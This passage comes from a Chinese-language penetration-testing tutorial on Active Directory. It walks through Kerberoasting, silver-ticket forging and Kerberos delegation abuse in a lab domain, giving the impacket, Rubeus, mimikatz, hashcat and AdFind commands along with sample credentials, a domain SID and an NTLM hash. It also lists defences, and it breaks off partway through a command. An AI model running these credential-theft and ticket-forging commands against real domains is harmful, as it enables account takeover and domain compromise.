<p>核心在于ST的加密是客户端和KDC进行协商的，客户端可以选择容易破解的<font color='red'>RC4_HMAC_MD5</font>算法进行加密</p>
<h3 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h3><p>首先随意输入一个域内正确的账户密码，来获取一个TGT</p>
<p>用获得的TGT，去请求指定SPN的ST，这个过程中用户和KDC可以协商加密算法，选择RC4_HMAC_MD5</p>
<p>（SPN是域内注册的服务器主体名称）</p>
<p>只有是有效的TGT，无论提供的域内账户密码是否有权限访问SPN服务，都会返回一个用能够请求该服务账号的hash并且以RC4_HMAC_MD5</p>
<p>算法加密的ST</p>
<p>（用于加密的是服务账户的hash，服务账户的密码一般是安装时，服务自己设置的，并且基本不会改动，易破解）</p>
<p>最后从TGS_REP数据包中提取ST，进行本地爆破，拿到能够访问该服务的明文密码</p>
<p>（我们拿到的是服务密码）</p>
<p>简而言之大概步骤就是</p>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><code class="hljs avrasm">查询域内注册于域用户下的SPN<br><br>请求指定SPN的<span class="hljs-keyword">ST</span><br><br>导出<span class="hljs-keyword">ST</span><br><br>破解<br></code></pre></td></tr></table></figure>





<h4 id="SPN的发现"><a href="#SPN的发现" class="headerlink" title="SPN的发现"></a>SPN的发现</h4><p>找到域内所有注册在域用户下的SPN</p>
<p>三个常用工具<font color='red'>RiskySPN</font>、<font color='red'>GetUserSPNs</font>和<font color='red'>PowerView.ps1</font></p>
<p><strong>RiskySPN</strong></p>
<p>属于powershell脚本</p>
<p>会自动检测识别若密码的服务票据</p>
<p>根据用户账户和密码过期时间来判别最容易包含弱密码的票据</p>
<figure class="highlight mathematica"><table><tr><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">powershell</span> <span class="hljs-operator">-</span><span class="hljs-variable">exec</span> <span class="hljs-variable">bypass</span><br><span class="hljs-built_in">Import</span><span class="hljs-operator">-</span><span class="hljs-built_in">Module</span> <span class="hljs-operator">.</span>\<span class="hljs-built_in">Find</span><span class="hljs-operator">-</span><span class="hljs-variable">PotentiallyCrackableAccounts</span><span class="hljs-operator">.</span><span class="hljs-variable">ps1</span><span class="hljs-operator">;</span><br><span class="hljs-built_in">Find</span><span class="hljs-operator">-</span><span class="hljs-variable">PotentiallyCrackableAccounts</span> <span class="hljs-operator">-</span><span class="hljs-variable">FullData</span><br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230217173901689.png"  ><span class="image-caption">image-20230217173901689</span></p>
<p>没有回显，有点尴尬，可能是因为没有用户注册吧</p>
<p><strong>GetUserSPNs</strong></p>
<p>会查询所有注册在域用户下的SPN</p>
<p>有两种VBS和powershell</p>
<figure class="highlight livescript"><table><tr><td class="code"><pre><code class="hljs livescript"><span class="hljs-comment">#VBS</span><br>cscript .<span class="hljs-string">\GetUserSPNs.vbs</span><br><br><span class="hljs-comment">#PowerShell</span><br>Import-Module .<span class="hljs-string">\GetUserSPNs.ps1</span><br></code></pre></td></tr></table></figure>



<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230217175705352.png"  ><span class="image-caption">image-20230217175705352</span></p>
<p>找到一个krbtgt的kadmin/changepw</p>
<p>这个是没有用的，它是随机生成的，几乎不可能爆破</p>
<p><strong>PowerView.ps1</strong></p>
<p>powersploit中recon目录下的脚本</p>
<p>用法</p>
<figure class="highlight mathematica"><table><tr><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">Import</span><span class="hljs-operator">-</span><span class="hljs-built_in">Module</span> <span class="hljs-operator">.</span>\<span class="hljs-variable">PowerView</span><span class="hljs-operator">.</span><span class="hljs-variable">ps1</span><br><span class="hljs-built_in">Get</span><span class="hljs-operator">-</span><span class="hljs-variable">NetUser</span> <span class="hljs-operator">-</span><span class="hljs-variable">SPN</span><br></code></pre></td></tr></table></figure>





<h4 id="请求服务票据"><a href="#请求服务票据" class="headerlink" title="请求服务票据"></a>请求服务票据</h4><p>主要有三种</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><code class="hljs reasonml">impacket的<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">GetUserSPNs</span>.</span></span>py<br><br>Rubeus<br><br>mimikatz<br><br>其中impacket和rubeus请求之后，会直接导出<br></code></pre></td></tr></table></figure>





<p><strong>impacket</strong></p>
<p>该工具包下的GetUserSPNs.py可以请求注册在用户下的所有SPN服务票据，也可以请求注册于指定用户下的SPN服务票据</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><code class="hljs crmsh"><span class="hljs-comment">#请求注册于用户下的所有SPN服务票据，以hashcat可以破解的格式保存</span><br>python3 GetUserSPNs.py -request -dc-ip 域控ip sayms.local/tony:admin123$% -outputfile hash.txt<br><br><span class="hljs-comment">#请求指定注册于tony用户下的SPN票据，以hashcat可以破解的格式保存</span><br>python3 GetUserSPNs.py -request -dc-ip 域控ip sayms.local/tony:admin123$% -outputfile hash.txt -request-<span class="hljs-keyword">user</span> <span class="hljs-title">tony</span><br></code></pre></td></tr></table></figure>





<p><strong>Rubeus</strong></p>
<p>该工具比较厉害</p>
<p>它会先用LDAP查询域内所有注册在域用户下的SPN</p>
<p>然后发送TGS包，最后直接输出能破解出的hash格式，例如John、hashcat</p>
<p>用法</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#导出所有的</span><br>Rubeus.exe kerberoast <span class="hljs-regexp">/format:john /</span>outfile:hash.txt<br><br><span class="hljs-comment">#导出指定SPN的服务票据</span><br>Rubeus.exe kerberoast <span class="hljs-regexp">/spn:SQLServer/</span>win7.sayms.local:<span class="hljs-number">1433</span><span class="hljs-regexp">/MSSQL /</span>format:john /outfile:hash.txt<br></code></pre></td></tr></table></figure>







<p><strong>mimikatz</strong></p>
<p>mimikatz不会导出票据，只会把请求完成之后的票据保存在内存中</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">kerberos::ask<span class="hljs-regexp">/target:SQLServer/</span>win7.sayms.local:<span class="hljs-number">1433</span>/MSSQL<br></code></pre></td></tr></table></figure>







<h4 id="导出服务票据"><a href="#导出服务票据" class="headerlink" title="导出服务票据"></a>导出服务票据</h4><p>首先是查看内存中保存了哪些票据</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#cmd</span><br>klist<br><br><span class="hljs-meta">#mimikatz</span><br>kerberos::list<br></code></pre></td></tr></table></figure>



<p><strong>mimikatz导出</strong></p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus">mimikatz<span class="hljs-selector-class">.exe</span> <span class="hljs-string">&quot;kerberos::list /export&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br></code></pre></td></tr></table></figure>

<p>会导出kirbi格式的票据文件</p>
<p><strong>empire导出</strong></p>
<p>empire下的Invoke-Kerberoast.ps1脚本，可以导出John格式和hashcat格式的票据文件</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Import-Module</span> .\<span class="hljs-built_in">Invoke-Kerberoast</span>.ps1;<br><span class="hljs-built_in">Invoke-Kerberoast</span> <span class="hljs-literal">-outputFormat</span> hashcat<br></code></pre></td></tr></table></figure>







<h4 id="破解票据"><a href="#破解票据" class="headerlink" title="破解票据"></a>破解票据</h4><p>其实就是破解hash</p>
<p>上面我们导出的文件有John格式、hashcat格式、kirbi格式</p>
<p>其中John和hashcat格式好说</p>
<p><strong>kirbi格式破解</strong></p>
<p>两种方法kerberoast、tgscrack</p>
<p>kerberoast里面的tgsrepcrack.py可以破解kirbi格式</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus">python2 tgsrepcrack<span class="hljs-selector-class">.py</span> pass<span class="hljs-selector-class">.txt</span> tony@SQLServer~win7<span class="hljs-selector-class">.sayms</span>.local~<span class="hljs-number">1433</span>~MSSQL-SAYMS<span class="hljs-selector-class">.LOCAL</span>.kirbi<br></code></pre></td></tr></table></figure>



<p>tgscrack</p>
<p>先把kirbi格式的文件转化为它能够破解的格式，然后再破解</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus">python2 extractServiceTicketParts<span class="hljs-selector-class">.py</span> tony@SQLServer~win7<span class="hljs-selector-class">.sayms</span>.local~<span class="hljs-number">1433</span>~MSSQL-SAYMS<span class="hljs-selector-class">.LOCAL</span><span class="hljs-selector-class">.kirbi</span> &gt; hash<span class="hljs-selector-class">.txt</span><br><br>go run tgscrack<span class="hljs-selector-class">.go</span> -hashfile hash<span class="hljs-selector-class">.txt</span> -wordlist pass.txt<br></code></pre></td></tr></table></figure>



<p><strong>hashcat格式破解</strong></p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus">hashcat -m <span class="hljs-number">13100</span> hash<span class="hljs-selector-class">.txt</span> pass<span class="hljs-selector-class">.txt</span> <span class="hljs-attr">--force</span><br></code></pre></td></tr></table></figure>





<h3 id="Kerberoasting防御"><a href="#Kerberoasting防御" class="headerlink" title="Kerberoasting防御"></a>Kerberoasting防御</h3><ol>
<li>首先能够执行该攻击最直接的原因是因为RC4_HMAC_MD5算法容易破解，强制改为AES256_HMAC算法，但是该算法会存在兼容性问题</li>
</ol>
<ol start="2">
<li>为服务账户设置强密码，或者定期修改密码</li>
</ol>
<ol start="3">
<li>好多服务都分配了过高的权限，导致攻击成功之后就能够权限提升，所有依照权限最小化原则设置权限</li>
</ol>
<ol start="4">
<li>日志审计，关注ID为4769的日志，如果突然有过多4769的日志，且加密类型为0x17，可能就是受到了攻击</li>
</ol>
<ol start="5">
<li>使用工具检测，zBang</li>
</ol>
<h2 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>白银票据攻击发生在TGS_REP阶段</p>
<p>TGS认证客户端发来的TGT，成功之后，将会返回指定服务的ST</p>
<p>ST中加密部分authorization-data，是用服务的密钥加密的</p>
<p>authorization-data中的PAC，PAC包含PAC_SERVER_CHECKSUM和PAC_PRIVSVR_CHECKSUM</p>
<p>其中PAC_SERVER_CHECKSUM是用服务的hash加密的，PAC_PRIVSVR_CHECKSUM是用krbtgt的hash加密的</p>
<p>但是</p>
<p>PAC_PRIVSVR_CHECKSUM签名的认证是可选的，且默认不开启，所以即使无法伪造PAC_PRIVSVR_CHECKSUM签名，也可完成攻击</p>
<p>所以只要能够<font color='red'>拿到指定服务的密钥，就可以伪造PAC，放入ST，从而以高权限访问服务</font></p>
<p>因为服务验证了TGS票据之后，一般不会返回域控去验证TGS的合法性</p>
<p>部分服务对应的关系</p>
<figure class="highlight mathematica"><table><tr><td class="code"><pre><code class="hljs mathematica">应用服务类型												需要的服务<br><span class="hljs-variable">WMI</span>														<span class="hljs-variable">HOST</span>、<span class="hljs-variable">RPCSS</span><br><br><span class="hljs-variable">PowerShell</span> <span class="hljs-variable">Remoting</span>										<span class="hljs-variable">HOST</span>、<span class="hljs-variable">HTTP</span><br><br><span class="hljs-variable">WinRM</span>													<span class="hljs-variable">HOST</span>、<span class="hljs-variable">HTTP</span><br><br><span class="hljs-variable">Scheduled</span> <span class="hljs-built_in">Tasks</span>											<span class="hljs-variable">HOST</span><br><br><span class="hljs-variable">Windows</span> <span class="hljs-built_in">File</span> <span class="hljs-built_in">Share</span>										<span class="hljs-variable">CIFS</span><br><br><span class="hljs-variable">LDAP</span> <span class="hljs-variable">operations</span>											<span class="hljs-variable">LDAP</span><br><br><span class="hljs-variable">Windows</span> <span class="hljs-variable">Remote</span> <span class="hljs-variable">Server</span> <span class="hljs-variable">Administrations</span> <span class="hljs-variable">Tools</span>				<span class="hljs-variable">RPCSS</span>、<span class="hljs-variable">LDAP</span>、<span class="hljs-variable">CIFS</span><br></code></pre></td></tr></table></figure>





<h3 id="需求-1"><a href="#需求-1" class="headerlink" title="需求"></a>需求</h3><figure class="highlight arcade"><table><tr><td class="code"><pre><code class="hljs arcade">服务的密钥（一般就是主机的<span class="hljs-built_in">hash</span>值）<br><br>域SID<br><br>域名<br><br>伪造的域用户，要是高权限用户<br></code></pre></td></tr></table></figure>





<h3 id="利用impacket攻击"><a href="#利用impacket攻击" class="headerlink" title="利用impacket攻击"></a>利用impacket攻击</h3><p>使用ticketer.py生成白银票据</p>
<p>然后导入票据</p>
<p>然后使用smbexec.py、secretsdump.py来进行利用</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><code class="hljs vim">#生成白银票据<br><span class="hljs-keyword">python3</span> ticketer.<span class="hljs-keyword">py</span> -domain-sid sid值 -nthash 哈希值 -spn 服务名/域控主机名.域名 -domain 域名 域管账户名字<br><span class="hljs-keyword">python3</span> ticketer.<span class="hljs-keyword">py</span> -domain-sid sid值 -nthash 哈希值 -spn cifs/DC.sayms.local -domain sayms.local administrator<br><br>#导入票据<br>export KRB5CCNAME=域管账户名.ccache<br><br>#远程连接域控<br><span class="hljs-keyword">python3</span> smbexec.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">no</span>-pass -<span class="hljs-keyword">k</span> 域管账户@域控主机名.域名 -dc-ip 域控ip<br><br>#导出管理员的hash<br><span class="hljs-keyword">python3</span> secretsdump.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">k</span> -<span class="hljs-keyword">no</span>-pass 域管账户@域控主机名.域名 -dc-ip 域控ip -just-dc-user 域管账户名<br></code></pre></td></tr></table></figure>

<p>S-1-5-21-199966615-2708578713-1277870648-500</p>
<p>80a28b3ca1457d5d09adf2e153d98b1d</p>
<h3 id="利用mimikatz攻击-1"><a href="#利用mimikatz攻击-1" class="headerlink" title="利用mimikatz攻击"></a>利用mimikatz攻击</h3><p>mimikatz进行攻击，使用的机器可以是域内的，也可以是非域内主机</p>
<p>非域内主机，需要将DNS服务设置为域控</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><code class="hljs angelscript">netsh <span class="hljs-keyword">interface</span> <span class="hljs-symbol">ip</span> <span class="hljs-symbol">set</span> <span class="hljs-symbol">dns</span> &quot;以太网&quot; <span class="hljs-symbol">static</span> 域控<span class="hljs-symbol">ip</span><br></code></pre></td></tr></table></figure>



<p>操作</p>
<p>首先尝试远程访问C盘</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230217232329609.png"  ><span class="image-caption">image-20230217232329609</span></p>
<p>权限不够，拒绝访问</p>
<p>生成白银票据，导入内存</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">kerberos</span>::golden /domain:sayms.local /S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">199966615</span>-<span class="hljs-number">2708578713</span>-<span class="hljs-number">1277870648</span> /target:DC.sayms.local /service:cifs /rc4:<span class="hljs-number">80</span>a28b3ca1457d5d09adf2e153d98b1d /user:administrator /ptt<br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230218094012033.png"  ><span class="image-caption">image-20230218094012033</span></p>
<p>然后就能够远程访问域控C盘</p>
<p>但是我这里无法访问是失败的，很奇怪导入成功还是无法访问</p>
<h3 id="利用CS攻击-1"><a href="#利用CS攻击-1" class="headerlink" title="利用CS攻击"></a>利用CS攻击</h3><p>和mimikatz一样，也可以是非域内主机，但是需要设置本地DNS为域控</p>
<p>CS是没有白银票据这个模块的，但是导入插件可以实现</p>
<p>使用方法很简单，只需要填相应参数即可</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><code class="hljs arcade">伪造用户名（一般是高权限用户）<br><br>ID值（一般是<span class="hljs-number">500</span>）<br><br>域名<br><br>SID<br><br>目标主机名<br><br><span class="hljs-built_in">hash</span>（服务对应的<span class="hljs-built_in">hash</span>）<br><br>伪造的服务<br></code></pre></td></tr></table></figure>





<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>防御白银票据比较好的方式是，开启验证PAC签名，前面说了，一部分原因就是因为默认不认证，所以可以伪造</p>
<p>但是对于一些本地注册系统服务来说，比如SMB、CIFS、HOST，是无法开启验证的</p>
<h2 id="委派攻击"><a href="#委派攻击" class="headerlink" title="委派攻击"></a>委派攻击</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p><font color='red'>委派是指把域内用户的权限委派给服务账户，使服务账户能够以用户的权限访问域内其他服务</font></p>
<p>在域内，只有主机账户和服务账户才有委派属性</p>
<h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>委派分为三种类型</p>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">非约束性委派<br><br>约束性委派<br><br>基于资源的约束性委派<br></code></pre></td></tr></table></figure>





<h4 id="非约束性委派"><a href="#非约束性委派" class="headerlink" title="非约束性委派"></a>非约束性委派</h4><p>非约束性委派，服务账户可以获取被委派用户的TGT，并将该TGT缓存到LSASS进程中，服务账户就可以使用该TGT访问任意服务</p>
<p>适用于windows server 2000</p>
<p>非约束性委派需要设置    SeEnableDelegationPrivilege特权，该权限默认    域管    和    企业管理员    拥有</p>
<p><font color='red'>域控默认配置了非约束性委派</font></p>
<p>拥有非约束性委派的机器账户userAccountControl属性的flag为WORKSTATION_TRUST_ACCOUNT|TRUSTED_FOR_DELEGATION，值为528384</p>
<p>拥有非约束性委派的服务账户userAccountControl属性的flag为NORMAL_ACCOUNT|TRUSTED_FOR_DELEGATION，值为524800</p>
<p>非约束性委派的流程</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230218113103964.png"  ><span class="image-caption">image-20230218113103964</span></p>
<p>从上面的流程，我们可以想到，如果我们控制了服务1，然后诱骗域管来请求服务1，我们就可以拿到域管TGT，从而可以高权限访问任意服务</p>
<h4 id="约束性委派"><a href="#约束性委派" class="headerlink" title="约束性委派"></a>约束性委派</h4><p>因为考虑到非约束性委派的不安全性，微软在Windows server 2003就发布了约束性委派</p>
<p>服务账户获取到TGT之后，只能访问用户指定的服务ST，即增加了msDS-AllowedToDelegateTo，这属性来控制能够访问的指定服务</p>
<p>约束性委派账户的设置是需要SeEnableDelegationPrivilege特权的，该权限只有域管和企业管理员拥有</p>
<p>约束性委派分为两种</p>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">只能使用kerberos，不能进行协议转换<br><br>可以使用任何身份认证协议，能够进行协议转换<br></code></pre></td></tr></table></figure>



<p>kerberos约束性委派的机器账户和服务账户的userAccountControl属性和正常账户一样，但是其msDS-AllowedToDelegateTo属性会有允许被委派服务的SPN</p>
<p>可以使用任何身份认证协议的约束性委派机器账户的userAccountControl属性的flag位为WORKSTATION_TRUST_ACCOUNT|TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION，值为16781312</p>
<p>其msDS-AllowedToDelegateTo属性会有允许被委派服务的SPN</p>
<p>可以使用任何身份认证协议的约束性委派服务账户的userAccountControl属性的flag位为</p>
<p>NORMAL_ACCOUNT|TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION，值为16777728</p>
<p>其msDS-AllowedToDelegateTo属性会有允许被委派服务的SPN</p>
<p><strong>约束性委派的流程</strong></p>
<p>为了kerberos能够支持约束性委派，微软的kerberos协议扩展了两个自协议</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><code class="hljs crmsh">S4u2Self（Service for <span class="hljs-keyword">User</span> <span class="hljs-title">to</span> Self）<br>可以代表任意用户请求自身的ST<br><br>S4u2Proxy（Service for <span class="hljs-keyword">User</span> <span class="hljs-title">to</span> Proxy）<br>用上一步获得的ST以用户的名义请求其他服务的ST<br></code></pre></td></tr></table></figure>



<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230218175023956.png"  ><span class="image-caption">image-20230218175023956</span></p>
<p>那么，如果我们拿到了服务1的权限，那么我们可以拥有，服务1以及可以访问的其他服务，如果服务1配置了到域控的CIFS约束性委派，那么我们可以利用服务1以任意用户权限访问域控</p>
<h4 id="基于资源的约束性委派"><a href="#基于资源的约束性委派" class="headerlink" title="基于资源的约束性委派"></a>基于资源的约束性委派</h4><p>为了使用户和资源更加独立，微软在windows server 2012中引入了基于资源的约束性委派</p>
<p>基于资源的约束性委派是把权限赋予了服务</p>
<p>配置了基于资源的约束性委派账户的msDS-AllowedToActOnBehalfOfOtherIdentity属性值为被允许委派账户的SID</p>
<p>流程</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230218220320603.png"  ><span class="image-caption">image-20230218220320603</span></p>
<p>谁能配置基于资源的约束性委派的权限？</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><code class="hljs powershell">上面可知基于资源的约束性委派，是通过msDS<span class="hljs-literal">-AllowedToActOnBehalfOfOtherIdentity</span>属性值的修改实现的<br><br>用AdFind查找谁能修改该属性，查询域内机器win2012R2<br>AdFind.exe <span class="hljs-operator">-f</span> <span class="hljs-string">&quot;&amp;(objectcategory=computer)(name=win2012R2)&quot;</span> msDS<span class="hljs-literal">-AllowedToActOnBehalfOfOtherIdentity</span><br></code></pre></td></tr></table></figure>

<p>如果没有该属性</p>
<figure class="highlight lasso"><table><tr><td class="code"><pre><code class="hljs lasso">那么就是谁创建了该属性，谁就有权限<br><br>用AdFind查找<br>AdFind.exe <span class="hljs-params">-b</span> <span class="hljs-literal">CN</span>=win2016,<span class="hljs-literal">CN</span>=Computers,DC=sayms,DC=<span class="hljs-built_in">local</span> <span class="hljs-params">-sc</span> getacl <span class="hljs-params">-sddl</span>+++ <span class="hljs-params">-sddlfilter</span> ;;<span class="hljs-string">&quot;WRT PROP&quot;</span>;;;<br></code></pre></td></tr></table></figure>



<p><strong>最后发现，拥有该权限的用户有域管、SELF、将计算机加入域的域用户</strong></p>
<p>利用方法</p>
<figure class="highlight css"><table><tr><td class="code"><pre><code class="hljs css">在服务<span class="hljs-selector-tag">B</span>上设置允许服务<span class="hljs-selector-tag">A</span>委派<br><br>控制服务<span class="hljs-selector-tag">A</span>使用S4u2Self协议，向域控请求任意用户访问自己的ST<br><br>控制服务<span class="hljs-selector-tag">A</span>使用S4u2Proxy协议，转发此ST去请求服务<span class="hljs-selector-tag">B</span>的ST<br><br>最后我们就可以使用任意用户去访问<span class="hljs-selector-tag">B</span>了<br></code></pre></td></tr></table></figure>

<p>利用条件</p>
<figure class="highlight css"><table><tr><td class="code"><pre><code class="hljs css">拥有服务<span class="hljs-selector-tag">A</span>的权限，拥有一个普通域内账户，一个域内账户可以创建<span class="hljs-number">10</span>个机器账户，机器账户可以当服务账户<br><br>拥有修改<span class="hljs-selector-tag">B</span>上允许<span class="hljs-selector-tag">A</span>访问的权限<br></code></pre></td></tr></table></figure>





<h3 id="查询能够域委派账户"><a href="#查询能够域委派账户" class="headerlink" title="查询能够域委派账户"></a>查询能够域委派账户</h3><p>上面说了各种域委派类型，下面就是找到能够进行域委派的账户</p>
<p>可以通过LDAP进行过滤</p>
<p>通过这三个属性可以找出准确的域委派账户</p>
<p>userAccountControl</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><code class="hljs abnf">该属性可以分别哪些账户可以进行域委派<br>因为只有主机账户和服务账户才可以进行域委派<br>该属性可以判别账户类型<br><br><span class="hljs-attribute">samAccountType</span><span class="hljs-operator">=</span><span class="hljs-number">805306369</span>为主机账户<br><span class="hljs-attribute">samAccountType</span><span class="hljs-operator">=</span><span class="hljs-number">805306368</span>为服务账户<br></code></pre></td></tr></table></figure>



<p>AllowedToDelegateTo</p>
<figure class="highlight css"><table><tr><td class="code"><pre><code class="hljs css">该属性是约束性委派账户才有值的，基于资源的约束性委派也有该属性，但是没有被赋值<br><br>该属性指向能够委派的服务SPN（就是<span class="hljs-selector-tag">A</span>账户委派的服务能够访问哪些服务）<br></code></pre></td></tr></table></figure>



<p>AllowedToActOnBehalfOfOtherIdentity</p>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">这个就是基于资源的约束性委派账户有的<br><br>这个属性的值是服务具有的，就是指向哪些服务能够访问它<br>权限在资源手中，不在KDC中<br></code></pre></td></tr></table></figure>

<p>通过这三个属性就能判别，一个账户是属于哪种账户</p>
<h4 id="查询非约束性委派的主机或服务账户"><a href="#查询非约束性委派的主机或服务账户" class="headerlink" title="查询非约束性委派的主机或服务账户"></a>查询非约束性委派的主机或服务账户</h4><p>powersploit下的PowerView.ps1</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">powershell -exec bypass<br><br><span class="hljs-keyword">Import</span>-Module .\PowerView.ps1;<br><br>#查询非约束性委派的主机<br><span class="hljs-keyword">Get</span>-NetComputer -Unconstrained -<span class="hljs-keyword">Domain</span> sayms.<span class="hljs-keyword">local</span><br><br>#查询非约束性委派的服务账户<br><span class="hljs-keyword">Get</span>-Netuser -Unconstrained -<span class="hljs-keyword">Domain</span> sayms.<span class="hljs-keyword">local</span> | <span class="hljs-keyword">select</span> <span class="hljs-type">name</span><br></code></pre></td></tr></table></figure>





<p>Adfind</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><code class="hljs armasm"><span class="hljs-comment">#查询非约束性委派的主机</span><br><span class="hljs-symbol">Adfind.exe</span> -<span class="hljs-keyword">b</span> <span class="hljs-string">&quot;DC=sayms,DC=local&quot;</span> -f <span class="hljs-string">&quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> -<span class="hljs-meta">dn</span><br><br><span class="hljs-comment">#查询非约束性委派的服务账户</span><br><span class="hljs-symbol">Adfind.exe</span> -<span class="hljs-keyword">b</span> <span class="hljs-string">&quot;DC=sayms,DC=local&quot;</span> -f <span class="hljs-string">&quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> -<span class="hljs-meta">dn</span><br></code></pre></td></tr></table></figure>





<p>Ldapsearch</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><code class="hljs perl"><span class="hljs-comment">#查询非约束性委派的主机</span><br>ldapsearch -<span class="hljs-keyword">x</span> -H ldap:<span class="hljs-regexp">//</span>域控IP:<span class="hljs-number">389</span> -D <span class="hljs-string">&quot;tony@sayms.local&quot;</span> -w admin123$% -b <span class="hljs-string">&quot;DC=sayms,DC=local&quot;</span> <span class="hljs-string">&quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> | <span class="hljs-keyword">grep</span> dn<br><br><span class="hljs-comment">#查询非约束性委派的服务账户</span><br>ldapsearch -<span class="hljs-keyword">x</span> -H ldap:<span class="hljs-regexp">//</span>域控IP:<span class="hljs-number">389</span> -D <span class="hljs-string">&quot;tony@sayms.local&quot;</span> -w admin123$% -b <span class="hljs-string">&quot;DC=sayms,DC=local&quot;</span> <span class="hljs-string">&quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> | <span class="hljs-keyword">grep</span> dn<br></code></pre></td></tr></table></figure>







<h4 id="查询约束性委派的主机或服务账户"><a href="#查询约束性委派的主机或服务账户" class="headerlink" title="查询约束性委派的主机或服务账户"></a>查询约束性委派的主机或服务账户</h4><p>empire下的powerview.ps1</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">powershell -exec bypass<br><br><span class="hljs-keyword">Import</span>-Module .\PowerView.ps1;<br><br>#查询约束性委派的主机<br><span class="hljs-keyword">Get</span>-DomainComputer -TrustedToAuth -<span class="hljs-keyword">Domain</span> sayma.<span class="hljs-keyword">local</span> | <span class="hljs-keyword">select</span> <span class="hljs-type">name</span>,msds-allowedtodelegateto<br><br>#查询约束性委派的服务账户<br><span class="hljs-keyword">Get</span>-DomainUser -TrustedToAuth -<span class="hljs-keyword">Domain</span> sayma.<span class="hljs-keyword">local</span> | <span class="hljs-keyword">select</span> <span class="hljs-type">name</span>,msds-allowedtodelegateto<br></code></pre></td></tr></table></figure>





<p>Adfind</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-comment">#查询约束性委派的主机</span><br>Adfind.exe -<span class="hljs-keyword">b </span><span class="hljs-string">&quot;DC=sayms,DC=local&quot;</span> -f <span class="hljs-string">&quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot;</span> msds-allowedtodelegateto<br><br><span class="hljs-comment">#查询约束性委派的服务账户</span><br>Adfind.exe -<span class="hljs-keyword">b </span><span class="hljs-string">&quot;DC=sayms,DC=local&quot;</span> -f <span class="hljs-string">&quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot;</span> msds-allowedtodelegateto<br></code></pre></td></tr></table></figure>





<p>Ldapsearch</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><code class="hljs perl"><span class="hljs-comment">#查询约束性委派的主机</span><br>ldapsearch -<span class="hljs-keyword">x</span> -H ldap:<span class="hljs-regexp">//</span>域控IP:<span class="hljs-number">389</span> -D <span class="hljs-string">&quot;tony@sayms.local&quot;</span> -w admin123$% -b <span class="hljs-string">&quot;DC=sayms,DC=local&quot;</span> <span class="hljs-string">&quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot;</span> | <span class="hljs-keyword">grep</span> -e dn -e msDS-AllowedToDelegateTo<br><br><span class="hljs-comment">#查询约束性委派的服务账户</span><br>ldapsearch -<span class="hljs-keyword">x</span> -H ldap:<span class="hljs-regexp">//</span>域控IP:<span class="hljs-number">389</span> -D <span class="hljs-string">&quot;tony@sayms.local&quot;</span> -w admin123$% -b <span class="hljs-string">&quot;DC=sayms,DC=local&quot;</span> <span 